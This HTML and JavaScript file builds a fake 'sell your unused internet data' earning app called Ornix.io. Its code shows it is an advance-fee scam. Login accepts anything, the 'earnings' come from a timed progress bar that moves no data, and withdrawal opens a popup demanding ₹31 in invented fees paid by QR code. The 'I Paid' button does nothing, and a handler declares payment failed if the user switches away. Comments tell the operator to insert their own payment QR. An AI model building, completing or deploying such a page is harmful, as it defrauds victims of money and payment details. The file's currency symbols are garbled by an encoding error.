<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Ornix.io</title>
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
  <!-- Lucide Icons -->
  <script src="https://unpkg.com/lucide@latest"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root {
      --bg: #0f172a;
      --panel: #1e293b;
      --muted: #94a3b8;
      --border: #334155;
      --brand: #38bdf8;
      --brand-2: #0ea5e9;
      --text: #f1f5f9;
      --bad: #f87171;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0; font-family: 'Inter', sans-serif;
      background: var(--bg); color: var(--text);
    }
    header {
      background: var(--panel); padding: 15px;
      text-align: center; font-size: 20px; font-weight: 600; color: var(--brand);
    }
    .tab { display: none; padding: 20px; }
    .tab.active { display: block; }

    .bottom-nav {
      position: fixed; bottom: 0; left: 0; width: 100%;
      display: flex; justify-content: space-around;
      background: var(--panel); border-top: 1px solid var(--border);
      padding: 10px 0;
    }
    .bottom-nav button {
      border: none; background: none; font-size: 14px; cursor: pointer;
      color: var(--muted); display: flex; flex-direction: column; align-items: center; gap: 4px;
    }
    .bottom-nav button.active-btn { color: var(--brand); font-weight: 600; }

    .offers { display: grid; gap: 15px; margin-top: 20px; }
    .offer {
      background: var(--panel); padding: 15px; border-radius: 10px; cursor: pointer;
      font-size: 16px; transition: 0.3s; text-align: left;
      display: flex; justify-content: space-between; align-items: center;
    }
    .offer:hover { background: #334155; }

    .progress-container { margin-top: 20px; }
    .progress-bar { width: 100%; background: #334155; border-radius: 10px; overflow: hidden; height: 20px; }
    .progress-fill { background: var(--brand); height: 100%; width: 0%; transition: width 0.2s linear; }

    #balance { font-size: 24px; font-weight: 700; margin: 20px 0; color: var(--brand); }

    .withdraw-box { max-width: 400px; margin: 0 auto; background: var(--panel);
      padding: 20px; border-radius: 15px; text-align: left; }
    .withdraw-box label { font-size: 14px; color: var(--muted); display: block; margin-bottom: 6px; }
    .withdraw-box input {
      width: 100%; padding: 10px; border: none; border-radius: 8px;
      margin-bottom: 15px; font-size: 14px;
    }
    .withdraw-btn {
      width: 100%; padding: 12px; font-size: 16px;
      background: var(--brand); color: var(--bg); border: none; border-radius: 8px;
      font-weight: 600; cursor: pointer;
    }
    .withdraw-btn:hover { background: var(--brand-2); }

    .login-container {
      max-width: 350px; margin: 80px auto; background: var(--panel);
      padding: 25px; border-radius: 15px; text-align: center;
    }
    .login-container h2 { margin-bottom: 20px; color: var(--brand); }
    .login-container input {
      width: 100%; padding: 10px; margin: 8px 0;
      border-radius: 8px; border: none; font-size: 14px;
    }
    .login-btn {
      width: 100%; padding: 12px; background: var(--brand);
      border: none; border-radius: 8px; font-size: 16px;
      font-weight: 600; cursor: pointer; margin-top: 15px; color: var(--bg);
    }
    .login-btn:hover { background: var(--brand-2); }

    .feature-card {
      background: var(--panel); padding: 20px; border-radius: 15px;
      display: flex; align-items: center; gap: 15px;
    }
    .feature-card h3 { margin: 0; font-size: 18px; color: var(--text); }
    .feature-card p { margin: 5px 0 0; font-size: 14px; color: var(--muted); }

    .speed-select { margin: 15px 0; padding: 10px; border-radius: 8px; border: none; font-size: 14px; }
    #networkSpeed { font-size: 14px; color: var(--muted); margin-top: 8px; }

    /* Popup */
    #withdrawPopup {
      display: none; position: fixed; inset: 0; z-index: 1000;
      background: rgba(0,0,0,.7); justify-content: center; align-items: center; padding: 16px;
    }
    .popup-card {
      background: var(--panel); border-radius: 16px; padding: 22px; width: 100%;
      max-width: 360px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,.4);
    }
    .fee-row { display: flex; justify-content: space-between; margin: 4px 0; font-size: 14px; }
    .fee-row .amt { color: var(--bad); }
    .fee-total { margin-top: 10px; font-weight: 700; }
    .popup-actions { display: flex; gap: 10px; margin-top: 14px; }
    .btn {
      flex: 1; padding: 10px 12px; border: none; border-radius: 10px; font-weight: 600; cursor: pointer;
    }
    .btn-cancel { background: #0b1224; color: var(--text); border: 1px solid var(--border); }
    .btn-pay    { background: var(--brand); color: var(--bg); }
    .qr {
      margin: 10px auto 0; border: 6px solid var(--border); border-radius: 12px;
      display: block; max-width: 220px; width: 100%;
    }
  </style>
</head>
<body>
  <header>Ornix.io</header>

  <!-- Login Page -->
  <div id="loginPage" class="tab active">
    <div class="login-container">
      <h2>Login / Register</h2>
      <input type="text" id="username" placeholder="Enter Username" />
      <input type="password" id="password" placeholder="Enter Password" />
      <button class="login-btn" onclick="login()">Login</button>
    </div>
  </div>

  <!-- Home Tab -->
  <div id="homeTab" class="tab">
    <h2 style="margin-bottom:10px;">üöÄ Start Selling Your Unused Data</h2>
    <p style="margin-bottom:25px; font-size:15px; color:#94a3b8;">
      Turn your leftover internet into <span style="color:#38bdf8; font-weight:600;">real cash</span>.
      Safe, secure, and fast. Join thousands who are already earning daily!
    </p>

    <div style="display:grid; gap:20px; max-width:600px; margin:0 auto;">
      <div class="feature-card">
        <i data-lucide="wifi" style="width:32px; height:32px; color:#38bdf8;"></i>
        <div>
          <h3>Sell Unused Data</h3>
          <p>Choose a package & earn instantly while selling MBs.</p>
        </div>
      </div>
      <div class="feature-card">
        <i data-lucide="trending-up" style="width:32px; height:32px; color:#38bdf8;"></i>
        <div>
          <h3>Track Earnings</h3>
          <p>Live progress bar shows your real-time sales.</p>
        </div>
      </div>
      <div class="feature-card">
        <i data-lucide="banknote" style="width:32px; height:32px; color:#38bdf8;"></i>
        <div>
          <h3>Withdraw Easily</h3>
          <p>Direct UPI transfer, secure & fast payout.</p>
        </div>
      </div>
    </div>
  </div>

  <!-- Earnings Tab -->
  <div id="earningsTab" class="tab">
    <h2>Available Offers</h2>
    <p style="color:#94a3b8;">Select a package and watch your earnings grow.</p>

    <label style="color:#94a3b8;">Select Speed:</label>
    <select id="speedSelect" class="speed-select">
      <option value="0.1">Slow</option>
      <option value="0.5" selected>Normal</option>
      <option value="1">Fast</option>
    </select>

    <div class="offers">
      <div class="offer" onclick="startSelling(1024,29)">1GB ‚Äì ‚Çπ29</div>
      <div class="offer" onclick="startSelling(2048,59)">2GB ‚Äì ‚Çπ59</div>
      <div class="offer" onclick="startSelling(5120,129)">5GB ‚Äì ‚Çπ129</div>
      <div class="offer" onclick="startSelling(10240,249)">10GB ‚Äì ‚Çπ249</div>
    </div>

    <div class="progress-container" id="progressContainer" style="display:none;">
      <p id="sellingStatus">Selling in progress...</p>
      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
      <p id="liveEarnings">‚Çπ0 earned</p>
      <p id="networkSpeed">Speed: 0 Mbps</p>
    </div>
  </div>

  <!-- Withdraw Tab -->
  <div id="withdrawTab" class="tab">
    <h2>Your Wallet</h2>
    <p id="balance">‚Çπ0</p>
    <div class="withdraw-box">
      <label for="upi">Enter UPI ID</label>
      <input type="text" id="upi" placeholder="example@upi" />
      <button class="withdraw-btn" onclick="withdraw()">Withdraw</button>
    </div>
  </div>

  <!-- Bottom Navigation -->
  <div class="bottom-nav" id="bottomNav" style="display:none;">
    <button id="homeBtn" class="active-btn" onclick="showTab('homeTab', this)">
      <i data-lucide="home"></i> Home
    </button>
    <button id="earningsBtn" onclick="showTab('earningsTab', this)">
      <i data-lucide="bar-chart-3"></i> Earnings
    </button>
    <button id="withdrawBtn" onclick="showTab('withdrawTab', this)">
      <i data-lucide="wallet"></i> Withdraw
    </button>
  </div>

  <!-- Withdraw Popup -->
  <div id="withdrawPopup">
    <div class="popup-card">
      <h3 style="color:var(--brand); margin:0 0 12px;">Withdrawal Processing</h3>

      <div style="text-align:left; font-size:14px; color:var(--text); margin-bottom:6px;">
        <div class="fee-row">
          <span>Platform Fee</span><span class="amt">‚Çπ15</span>
        </div>
        <div class="fee-row">
          <span>Bank Process Fee</span><span class="amt">‚Çπ9</span>
        </div>
        <div class="fee-row">
          <span>GST</span><span class="amt">‚Çπ7</span>
        </div>
        <hr style="border:0; border-top:1px solid var(--border); margin:10px 0;">
        <div class="fee-row fee-total">
          <span>Total Fee</span><span style="color:var(--brand)">‚Çπ31</span>
        </div>
      </div>

      <p style="color:var(--muted); margin:6px 0 8px;">Scan QR to pay fees</p>
      <!-- QR image (no name text; only QR). SRC set from JS constant below -->
      <img id="qrImg" class="qr" alt="QR Code" />

      <div class="popup-actions">
        <button class="btn btn-cancel" onclick="closeWithdrawPopup()">Cancel</button>
        <!-- Optional: a 'I Paid' button only closes popup (no balance change here) -->
        <button class="btn btn-pay" onclick="confirmFeePaid()">I Paid</button>
      </div>
    </div>
  </div>

  <script>
    let balance = 0;
    let selling = false;
    let speedInterval;

    function login() {
      const user = document.getElementById("username").value;
      const pass = document.getElementById("password").value;
      if (user && pass) {
        document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
        document.getElementById("homeTab").classList.add("active");
        document.getElementById("bottomNav").style.display = "flex";
        lucide.createIcons();
      } else {
        alert("Please enter username & password");
      }
    }

    function showTab(tabId, btn) {
      document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
      document.getElementById(tabId).classList.add("active");
      document.querySelectorAll(".bottom-nav button").forEach(b => b.classList.remove("active-btn"));
      btn.classList.add("active-btn");
    }

    function startSelling(totalMB, price) {
      if (selling) { alert("Selling already in progress!"); return; }
      selling = true;

      let sold = 0, earnings = 0;
      const perMB = price / totalMB;
      const step = parseFloat(document.getElementById("speedSelect").value);
      const progressFill = document.getElementById("progressFill");
      const progressContainer = document.getElementById("progressContainer");
      const sellingStatus = document.getElementById("sellingStatus");
      const liveEarnings = document.getElementById("liveEarnings");
      const networkSpeed = document.getElementById("networkSpeed");

      progressContainer.style.display = "block";
      sellingStatus.innerText = "Selling in progress... [Stay Awake]";
      progressFill.style.width = "0%";
      liveEarnings.innerText = "‚Çπ0 earned";
      networkSpeed.innerText = "Speed: 0 Mbps";

      const interval = setInterval(() => {
        sold += step;
        earnings = sold * perMB;
        const percent = (sold / totalMB) * 100;
        progressFill.style.width = percent + "%";
        liveEarnings.innerText = "‚Çπ" + earnings.toFixed(2) + " earned";

        if (sold >= totalMB) {
          clearInterval(interval);
          clearInterval(speedInterval);
          balance += price;
          document.getElementById("balance").innerText = "‚Çπ" + balance;
          sellingStatus.innerText = "‚úÖ Selling complete! Added ‚Çπ" + price + " to wallet.";
          networkSpeed.innerText = "Speed: 0 Mbps";
          selling = false;
        }
      }, 200);

      speedInterval = setInterval(() => {
        const mbps = (step * 5).toFixed(2); // step/200ms ‚Üí x5 per second
        networkSpeed.innerText = "Speed: " + mbps + " Mbps";
      }, 1000);
    }

    function withdraw() {
      const upi = document.getElementById("upi").value;
      if (!upi) { alert("Enter your UPI ID"); return; }
      if (balance > 0) {
        // Only show the fee+QR popup; real withdrawal happens after fee verification on your backend
        document.getElementById("withdrawPopup").style.display = "flex";
      } else {
        alert("‚ö†Ô∏è Insufficient Funds‚ùó");
      }
    }

    function closeWithdrawPopup() {
      document.getElementById("withdrawPopup").style.display = "none";
    }

    function confirmFeePaid() {
      // You can hook this to your verification later.
      alert("Thanks! We‚Äôll verify your fee payment shortly.");
      closeWithdrawPopup();
    }

    // Auto-fail if user leaves app while popup is open
    document.addEventListener("visibilitychange", function () {
      if (document.hidden) {
        const popup = document.getElementById("withdrawPopup");
        if (popup && popup.style.display === "flex") {
          alert("‚ùå Payment failed because you left the app.");
          popup.style.display = "none";
        }
      }
    });

    // --------- QR IMAGE (Base64) -----------
    // Replace the value of QR_DATA_URL with your actual base64 data URL for the QR you shared.
    // Example format: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA..."
    const QR_DATA_URL =
      "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAASsJTYQAAAAASUVORK5CYII="; 
      // ‚Üë This is just a 1x1 PNG placeholder. Replace with your QR‚Äôs Base64!

    // Set QR src on load
    (function setQR(){
      const img = document.getElementById("qrImg");
      if (img && QR_DATA_URL) img.src = QR_DATA_URL;
    })();

    lucide.createIcons();
  </script>
</body>
</html>
